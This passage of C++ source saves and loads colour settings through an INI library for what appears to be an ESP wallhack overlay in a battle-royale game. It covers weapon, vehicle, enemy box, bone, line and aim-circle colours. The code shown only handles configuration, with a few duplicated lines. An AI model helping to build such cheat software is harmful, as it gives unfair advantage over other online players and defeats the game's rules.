	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_EnergyDrink_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_EnergyDrink_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_AdrenalineSyringe_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_AdrenalineSyringe_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Bandage_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Bandage_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_AirDrop_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_AirDrop_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_DeadBox_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_DeadBox_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_AirAttack_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_AirAttack_Color[i] * 255)); }


	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("plinecoloropen", str.append(std::to_string(i)).c_str(), fround(Setting::plinecoloropen[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("plinecolorcover", str.append(std::to_string(i)).c_str(), fround(Setting::plinecolorcover[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("botlinecoloropen", str.append(std::to_string(i)).c_str(), fround(Setting::botlinecoloropen[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("botlinecolorcover", str.append(std::to_string(i)).c_str(), fround(Setting::botlinecolorcover[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("cornerboxcolor", str.append(std::to_string(i)).c_str(), fround(cornerboxcolor[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("bcornerboxcolor", str.append(std::to_string(i)).c_str(), fround(bcornerboxcolor[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("EnemyLineOfSightColor", str.append(std::to_string(i)).c_str(), fround(Setting::EnemyLineOfSightColor[i] * 255)); }

	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("vahicle_Text_item_Coupe_Color", str.append(std::to_string(i)).c_str(), fround(Setting::vahicle_Text_item_Coupe_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("vahicle_Text_item_Buggy_Color", str.append(std::to_string(i)).c_str(), fround(Setting::vahicle_Text_item_Buggy_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("vahicle_Text_item_BRDM_Color", str.append(std::to_string(i)).c_str(), fround(Setting::vahicle_Text_item_BRDM_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("vahicle_Text_item_Scooter_Color", str.append(std::to_string(i)).c_str(), fround(Setting::vahicle_Text_item_Scooter_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("vahicle_Text_item_Motorcycle_Color", str.append(std::to_string(i)).c_str(), fround(Setting::vahicle_Text_item_Motorcycle_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("vahicle_Text_item_Motorcycle3_Color", str.append(std::to_string(i)).c_str(), fround(Setting::vahicle_Text_item_Motorcycle3_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("vahicle_Text_item_Snowmobile_Color", str.append(std::to_string(i)).c_str(), fround(Setting::vahicle_Text_item_Snowmobile_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("vahicle_Text_item_SnowBike_Color", str.append(std::to_string(i)).c_str(), fround(Setting::vahicle_Text_item_SnowBike_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("vahicle_Text_item_Tuk_Color", str.append(std::to_string(i)).c_str(), fround(Setting::vahicle_Text_item_Tuk_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("vahicle_Text_item_Dacia_Color", str.append(std::to_string(i)).c_str(), fround(Setting::vahicle_Text_item_Dacia_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("vahicle_Text_item_Rony_Color", str.append(std::to_string(i)).c_str(), fround(Setting::vahicle_Text_item_Rony_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("vahicle_Text_item_UAZ_Color", str.append(std::to_string(i)).c_str(), fround(Setting::vahicle_Text_item_UAZ_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("vahicle_Text_item_PG117_Color", str.append(std::to_string(i)).c_str(), fround(Setting::vahicle_Text_item_PG117_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("vahicle_Text_item_Aquarail_Color", str.append(std::to_string(i)).c_str(), fround(Setting::vahicle_Text_item_Aquarail_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("vahicle_Text_item_Aquarail_Color", str.append(std::to_string(i)).c_str(), fround(Setting::vahicle_Text_item_Aquarail_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("vahicle_Text_item_Glider_Color", str.append(std::to_string(i)).c_str(), fround(Setting::vahicle_Text_item_Glider_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("vahicle_Text_item_BigFoot_Color", str.append(std::to_string(i)).c_str(), fround(Setting::vahicle_Text_item_BigFoot_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("vahicle_Text_item_Capsule_Color", str.append(std::to_string(i)).c_str(), fround(Setting::vahicle_Text_item_Capsule_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("vahicle_Text_item_UTV_Color", str.append(std::to_string(i)).c_str(), fround(Setting::vahicle_Text_item_UTV_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("vahicle_Text_item_ATV2_Color", str.append(std::to_string(i)).c_str(), fround(Setting::vahicle_Text_item_ATV2_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("vahicle_Text_item_Sportsa_Color", str.append(std::to_string(i)).c_str(), fround(Setting::vahicle_Text_item_Sportsa_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("vahicle_Text_item_Sports_Color", str.append(std::to_string(i)).c_str(), fround(Setting::vahicle_Text_item_Sports_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("vahicle_Text_item_CoupeRB_Color", str.append(std::to_string(i)).c_str(), fround(Setting::vahicle_Text_item_CoupeRB_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("vahicle_Text_item_Tesla_Color", str.append(std::to_string(i)).c_str(), fround(Setting::vahicle_Text_item_Tesla_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("vahicle_Text_item_Minibus_Color", str.append(std::to_string(i)).c_str(), fround(Setting::vahicle_Text_item_Minibus_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("vahicle_Text_item_Gravity_Color", str.append(std::to_string(i)).c_str(), fround(Setting::vahicle_Text_item_Gravity_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("vahicle_Text_item_Motorglider_Color", str.append(std::to_string(i)).c_str(), fround(Setting::vahicle_Text_item_Motorglider_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("vahicle_Text_item_PickUpTruck_Color", str.append(std::to_string(i)).c_str(), fround(Setting::vahicle_Text_item_PickUpTruck_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("vahicle_Text_item_Plane_Color", str.append(std::to_string(i)).c_str(), fround(Setting::vahicle_Text_item_Plane_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("vahicle_Text_item_Bike_Color", str.append(std::to_string(i)).c_str(), fround(Setting::vahicle_Text_item_Bike_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("vahicle_Text_item_Helicopter_Color", str.append(std::to_string(i)).c_str(), fround(Setting::vahicle_Text_item_Helicopter_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("vahicle_Text_item_SnowBoard_Color", str.append(std::to_string(i)).c_str(), fround(Setting::vahicle_Text_item_SnowBoard_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("vehbgcolor", str.append(std::to_string(i)).c_str(), fround(vehbgcolor[i] * 255)); }





	if (ini.SaveFile(Path.c_str()) < 0)
	{
		return false;
	}
	return true;
}
void LoadConfiggg(std::string Path)
{
	CSimpleIniA ini;
	ini.SetUnicode();
	SI_Error rc = ini.LoadFile(Path.c_str());
	if (rc < 0) { std::cout << "File not found"; };
	for (int i = 0; i < 4; i++) { std::string str = "key"; vehbgcolor[i] = fround(ini.GetLongValue("vehbgcolor", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; vehbgcolor[i] = fround(ini.GetLongValue("vehbgcolor", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::vahicle_Text_item_Buggy_Color[i] = fround(ini.GetLongValue("vahicle_Text_item_Buggy_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::vahicle_Text_item_BRDM_Color[i] = fround(ini.GetLongValue("vahicle_Text_item_BRDM_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::vahicle_Text_item_Scooter_Color[i] = fround(ini.GetLongValue("vahicle_Text_item_Scooter_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::vahicle_Text_item_Motorcycle_Color[i] = fround(ini.GetLongValue("vahicle_Text_item_Motorcycle_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::vahicle_Text_item_Motorcycle3_Color[i] = fround(ini.GetLongValue("vahicle_Text_item_Motorcycle3_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::vahicle_Text_item_Snowmobile_Color[i] = fround(ini.GetLongValue("vahicle_Text_item_Snowmobile_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::vahicle_Text_item_SnowBike_Color[i] = fround(ini.GetLongValue("vahicle_Text_item_SnowBike_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::vahicle_Text_item_Tuk_Color[i] = fround(ini.GetLongValue("vahicle_Text_item_Tuk_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::vahicle_Text_item_Dacia_Color[i] = fround(ini.GetLongValue("vahicle_Text_item_Dacia_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::vahicle_Text_item_Rony_Color[i] = fround(ini.GetLongValue("vahicle_Text_item_Rony_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::vahicle_Text_item_UAZ_Color[i] = fround(ini.GetLongValue("vahicle_Text_item_UAZ_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::vahicle_Text_item_PG117_Color[i] = fround(ini.GetLongValue("vahicle_Text_item_PG117_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::vahicle_Text_item_Aquarail_Color[i] = fround(ini.GetLongValue("vahicle_Text_item_Aquarail_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::vahicle_Text_item_Coupe_Color[i] = fround(ini.GetLongValue("vahicle_Text_item_Coupe_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::vahicle_Text_item_Glider_Color[i] = fround(ini.GetLongValue("vahicle_Text_item_Glider_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::vahicle_Text_item_BigFoot_Color[i] = fround(ini.GetLongValue("vahicle_Text_item_BigFoot_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::vahicle_Text_item_Capsule_Color[i] = fround(ini.GetLongValue("vahicle_Text_item_Capsule_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::vahicle_Text_item_UTV_Color[i] = fround(ini.GetLongValue("vahicle_Text_item_UTV_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::vahicle_Text_item_ATV2_Color[i] = fround(ini.GetLongValue("vahicle_Text_item_ATV2_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::vahicle_Text_item_Sportsa_Color[i] = fround(ini.GetLongValue("vahicle_Text_item_Sportsa_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::vahicle_Text_item_Sports_Color[i] = fround(ini.GetLongValue("vahicle_Text_item_Sports_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::vahicle_Text_item_CoupeRB_Color[i] = fround(ini.GetLongValue("vahicle_Text_item_CoupeRB_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::vahicle_Text_item_Tesla_Color[i] = fround(ini.GetLongValue("vahicle_Text_item_Tesla_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::vahicle_Text_item_Minibus_Color[i] = fround(ini.GetLongValue("vahicle_Text_item_Minibus_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::vahicle_Text_item_Gravity_Color[i] = fround(ini.GetLongValue("vahicle_Text_item_Gravity_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::vahicle_Text_item_Motorglider_Color[i] = fround(ini.GetLongValue("vahicle_Text_item_Motorglider_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::vahicle_Text_item_PickUpTruck_Color[i] = fround(ini.GetLongValue("vahicle_Text_item_PickUpTruck_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::vahicle_Text_item_Plane_Color[i] = fround(ini.GetLongValue("vahicle_Text_item_Plane_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::vahicle_Text_item_Bike_Color[i] = fround(ini.GetLongValue("vahicle_Text_item_Bike_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::vahicle_Text_item_Helicopter_Color[i] = fround(ini.GetLongValue("vahicle_Text_item_Helicopter_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::vahicle_Text_item_SnowBoard_Color[i] = fround(ini.GetLongValue("vahicle_Text_item_SnowBoard_Color", str.append(std::to_string(i)).c_str()) / 255.0); }

	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::plinecoloropen[i] = fround(ini.GetLongValue("plinecoloropen", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::plinecolorcover[i] = fround(ini.GetLongValue("plinecolorcover", str.append(std::to_string(i)).c_str()) / 255.0); }

	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::botlinecoloropen[i] = fround(ini.GetLongValue("botlinecoloropen", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::botlinecolorcover[i] = fround(ini.GetLongValue("botlinecolorcover", str.append(std::to_string(i)).c_str()) / 255.0); }


	for (int i = 0; i < 4; i++) { std::string str = "key"; cornerboxcolor[i] = fround(ini.GetLongValue("cornerboxcolor", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; bcornerboxcolor[i] = fround(ini.GetLongValue("bcornerboxcolor", str.append(std::to_string(i)).c_str()) / 255.0); }

	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::EnemyLineOfSightColor[i] = fround(ini.GetLongValue("EnemyLineOfSightColor", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::fovcirclecolor[i] = fround(ini.GetLongValue("fovcirclecolor", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::vehcolor[i] = fround(ini.GetLongValue("vehcolor", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::pnamecolorcolor[i] = fround(ini.GetLongValue("pnamecolorcolor", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::botnamecolorcolor[i] = fround(ini.GetLongValue("botnamecolorcolor", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::pdistancecolor[i] = fround(ini.GetLongValue("pdistancecolor", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::bdistancecolor[i] = fround(ini.GetLongValue("bdistancecolor", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::bonecolor[i] = fround(ini.GetLongValue("bonecolor", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::botbonecolor[i] = fround(ini.GetLongValue("botbonecolor", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::pBoxcolor[i] = fround(ini.GetLongValue("pBoxcolor", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::bBoxcolor[i] = fround(ini.GetLongValue("bBoxcolor", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::plinecolor[i] = fround(ini.GetLongValue("plinecolor", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::botlinecolor[i] = fround(ini.GetLongValue("botlinecolor", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::magicline[i] = fround(ini.GetLongValue("magicline", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::weaponenemycolor[i] = fround(ini.GetLongValue("weaponenemycolor", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::botweaponenemycolor[i] = fround(ini.GetLongValue("botweaponenemycolor", str.append(std::to_string(i)).c_str()) / 255.0); }

	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_AKM_Color[i] = fround(ini.GetLongValue("Esp_Item_AKM_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_M249_Color[i] = fround(ini.GetLongValue("Esp_Item_M249_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_MG3_Color[i] = fround(ini.GetLongValue("Esp_Item_MG3_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_M762_Color[i] = fround(ini.GetLongValue("Esp_Item_M762_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Mk47Mutant_Color[i] = fround(ini.GetLongValue("Esp_Item_Mk47Mutant_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_DP28_Color[i] = fround(ini.GetLongValue("Esp_Item_DP28_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_SCARL_Color[i] = fround(ini.GetLongValue("Esp_Item_SCARL_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_M416_Color[i] = fround(ini.GetLongValue("Esp_Item_M416_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_M16A4_Color[i] = fround(ini.GetLongValue("Esp_Item_M16A4_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_FAMAS_Color[i] = fround(ini.GetLongValue("Esp_Item_FAMAS_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_AN94_Color[i] = fround(ini.GetLongValue("Esp_Item_AN94_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_HoneyBadger_Color[i] = fround(ini.GetLongValue("Esp_Item_HoneyBadger_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_HuntingBow_Color[i] = fround(ini.GetLongValue("Esp_Item_HuntingBow_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_CrossbowBorderland_Color[i] = fround(ini.GetLongValue("Esp_Item_CrossbowBorderland_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_G36C_Color[i] = fround(ini.GetLongValue("Esp_Item_G36C_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_QBZ_Color[i] = fround(ini.GetLongValue("Esp_Item_QBZ_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Groza_Color[i] = fround(ini.GetLongValue("Esp_Item_Groza_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_AUG_Color[i] = fround(ini.GetLongValue("Esp_Item_AUG_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_VSS_Color[i] = fround(ini.GetLongValue("Esp_Item_VSS_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Mk12_Color[i] = fround(ini.GetLongValue("Esp_Item_Mk12_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Win94_Color[i] = fround(ini.GetLongValue("Esp_Item_Win94_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_QBU_Color[i] = fround(ini.GetLongValue("Esp_Item_QBU_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_SLR_Color[i] = fround(ini.GetLongValue("Esp_Item_SLR_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_SKS_Color[i] = fround(ini.GetLongValue("Esp_Item_SKS_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Mini14_Color[i] = fround(ini.GetLongValue("Esp_Item_Mini14_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Mk14_Color[i] = fround(ini.GetLongValue("Esp_Item_Mk14_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_M24_Color[i] = fround(ini.GetLongValue("Esp_Item_M24_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_AMR_Color[i] = fround(ini.GetLongValue("Esp_Item_AMR_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Awm_Color[i] = fround(ini.GetLongValue("Esp_Item_Awm_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Awmimo_Color[i] = fround(ini.GetLongValue("Esp_Item_Awmimo_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Kar98k_Color[i] = fround(ini.GetLongValue("Esp_Item_Kar98k_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Mosin_Color[i] = fround(ini.GetLongValue("Esp_Item_Mosin_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_CrossBow_Color[i] = fround(ini.GetLongValue("Esp_Item_CrossBow_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_CrossBow_Quick_Color[i] = fround(ini.GetLongValue("Esp_Item_CrossBow_Quick_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_SawedOff_Color[i] = fround(ini.GetLongValue("Esp_Item_SawedOff_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_M1014_Color[i] = fround(ini.GetLongValue("Esp_Item_M1014_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Neostead_Color[i] = fround(ini.GetLongValue("Esp_Item_Neostead_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_S1897_Color[i] = fround(ini.GetLongValue("Esp_Item_S1897_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_S686_Color[i] = fround(ini.GetLongValue("Esp_Item_S686_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_DBS_Color[i] = fround(ini.GetLongValue("Esp_Item_DBS_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_S12K_Color[i] = fround(ini.GetLongValue("Esp_Item_S12K_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Cowbar_Color[i] = fround(ini.GetLongValue("Esp_Item_Cowbar_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Machete_Color[i] = fround(ini.GetLongValue("Esp_Item_Machete_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Sickle_Color[i] = fround(ini.GetLongValue("Esp_Item_Sickle_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
